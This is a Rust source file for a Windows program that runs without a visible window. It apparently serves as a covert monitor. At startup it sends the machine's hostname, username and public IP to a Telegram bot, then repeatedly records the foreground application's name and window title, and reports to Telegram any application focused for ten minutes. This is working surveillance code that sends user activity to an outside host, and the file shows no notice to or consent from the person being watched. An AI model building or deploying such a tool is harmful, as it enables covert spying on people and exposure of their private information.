#![windows_subsystem = "windows"]

use std::env;
use std::fs;
use std::path::PathBuf;
use std::thread;
use std::time::{Duration, Instant};

use ini::Ini;
use windows::Win32::Foundation::{HWND, MAX_PATH};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, QueryFullProcessImageNameW, PROCESS_NAME_WIN32};
use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId};

// Target focus duration in seconds (10 minutes)
const TARGET_DURATION_SECS: u64 = 600;
// Polling interval in seconds
const POLL_INTERVAL_SECS: u64 = 5;

#[derive(Debug, Clone)]
struct Config {
    bot_token: String,
    chat_id: String,
}

fn load_config() -> Result<Config, String> {
    // Look for config.ini in the same directory as the executable
    let mut config_path: PathBuf = env::current_exe().map_err(|e| format!("Failed to get current executable path: {}", e))?;
    config_path.pop(); // Remove the executable name
    config_path.push("config.ini");

    if !config_path.exists() {
        return Err(format!("Config file not found at {:?}", config_path));
    }

    let conf = Ini::load_from_file(&config_path)
        .map_err(|e| format!("Failed to load config.ini: {}", e))?;

    let section = conf.section(Some("Telegram")).ok_or("Missing [Telegram] section in config.ini")?;

    let bot_token = section.get("bot_token").ok_or("Missing bot_token in [Telegram] section")?.to_string();
    let chat_id = section.get("chat_id").ok_or("Missing chat_id in [Telegram] section")?.to_string();

    Ok(Config { bot_token, chat_id })
}

fn send_telegram_message(config: &Config, message: &str) {
    let url = format!("https://api.telegram.org/bot{}/sendMessage", config.bot_token);

    let payload = serde_json::json!({
        "chat_id": config.chat_id,
        "text": message,
    });

    if let Ok(_) = ureq::post(&url)
        .set("Content-Type", "application/json")
        .send_string(&payload.to_string()) {  }
}

fn get_foreground_app_info() -> Option<(String, String)> {
    unsafe {
        let hwnd: HWND = GetForegroundWindow();
        if hwnd.0.is_null() {
            return None;
        }

        let mut title_buffer = [0u16; 512];
        let title_len = GetWindowTextW(hwnd, &mut title_buffer);
        let title = if title_len > 0 {
            String::from_utf16_lossy(&title_buffer[..title_len as usize])
        } else {
            String::new()
        };

        let mut process_id: u32 = 0;
        GetWindowThreadProcessId(hwnd, Some(&mut process_id as *mut _));

        if process_id == 0 {
            return None;
        }

        let process_handle_result = OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION,
            false,
            process_id,
        );

        let process_handle = match process_handle_result {
            Ok(handle) => handle,
            Err(_) => return None,
        };

        let mut buffer = [0u16; MAX_PATH as usize];
        let mut len = MAX_PATH;
        let success = QueryFullProcessImageNameW(
            process_handle,
            PROCESS_NAME_WIN32,
            windows::core::PWSTR::from_raw(buffer.as_mut_ptr()),
            &mut len,
        );

        let _ = windows::Win32::Foundation::CloseHandle(process_handle);

        if success.is_ok() && len > 0 {
            let path_str = String::from_utf16_lossy(&buffer[..len as usize]);
            // Extract just the executable name from the path
            let path = std::path::Path::new(&path_str);
            if let Some(file_name) = path.file_name() {
                let exe_name = file_name.to_string_lossy().into_owned();
                return Some((exe_name, title));
            }
        }
    }
    None
}

fn main() {
    let config = match load_config() {
        Ok(c) => c,
        Err(e) => {
            // Write to a log file since this is a background process
            let _ = fs::write("error.log", format!("Startup error: {}\n", e));
            return;
        }
    };

    // Fetch machine info on startup
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "UnknownHost".to_string());
    let username = env::var("USERNAME").unwrap_or_else(|_| "UnknownUser".to_string());

    // Fetch public IP address
    let ip_address = match ureq::get("https://api.ipify.org").call() {
        Ok(response) => response.into_string().unwrap_or_else(|_| "UnknownIP".to_string()),
        Err(_) => "UnknownIP".to_string(),
    };

    // Send startup welcome notification
    let startup_msg = format!("{}/{}/{} - started", hostname, username, ip_address);
    send_telegram_message(&config, &startup_msg);

    let mut current_app_info: Option<(String, String)> = None;
    let mut app_focus_start: Instant = Instant::now();
    let mut notification_sent = false;

    loop {
        let active_app_info = get_foreground_app_info();

        let app_changed = match (&active_app_info, &current_app_info) {
            (Some((active_app_name, _)), Some((current_app_name, _))) => active_app_name != current_app_name,
            (None, None) => false,
            _ => true,
        };

        if app_changed {
            // App has changed
            current_app_info = active_app_info;
            app_focus_start = Instant::now();
            notification_sent = false;
        } else if let Some((app_name, _)) = current_app_info.clone() {
            // App is the same, but update title
            if let Some((_, ref new_title)) = active_app_info {
                current_app_info = Some((app_name.clone(), new_title.clone()));
            }

            let elapsed = app_focus_start.elapsed().as_secs();

            if elapsed >= TARGET_DURATION_SECS && !notification_sent {
                // Time exceeded, send notification
                let title_to_send = current_app_info.as_ref().map(|(_, t)| t.clone()).unwrap_or_default();
                let alert_msg = format!("{} - {}", app_name, title_to_send);
                send_telegram_message(&config, &alert_msg);
                notification_sent = true; // ensure we only send once per continuous session
            }
        }

        thread::sleep(Duration::from_secs(POLL_INTERVAL_SECS));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn test_config_parsing() {
        let test_config = "[Telegram]\nbot_token=test_token\nchat_id=123456";
        fs::write("config.ini", test_config).unwrap();

        let conf = Ini::load_from_str(test_config).unwrap();
        let section = conf.section(Some("Telegram")).unwrap();
        assert_eq!(section.get("bot_token").unwrap(), "test_token");
        assert_eq!(section.get("chat_id").unwrap(), "123456");

        let _ = fs::remove_file("config.ini");
    }
}
